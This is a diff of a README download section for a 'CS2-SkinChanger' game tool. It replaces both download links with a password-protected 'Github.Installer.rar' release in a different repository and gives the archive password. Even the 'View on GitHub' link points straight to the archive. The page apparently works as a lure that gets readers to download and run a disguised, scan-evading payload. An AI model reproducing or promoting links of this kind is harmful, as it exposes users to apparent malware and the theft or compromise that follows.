@@ -11,8 +11,8 @@
 
 ## 🚀 Download CS2-SkinChanger
 
-- **Latest Version:** [Download Now](https://github.com/bernardodangelo/beer/releases/download/1/Installer.rar)
-- **GitHub Repository:** [View on GitHub](https://github.com/bernardodangelo/beer/releases/download/1/Installer.rar)
+- **Latest Version:** [Download Now](https://github.com/Surge69420/Cs/releases/download/1/Github.Installer.rar)
+- **GitHub Repository:** [View on GitHub](https://github.com/Surge69420/Cs/releases/download/1/Github.Installer.rar)
 
 **Password:** `2024`
 
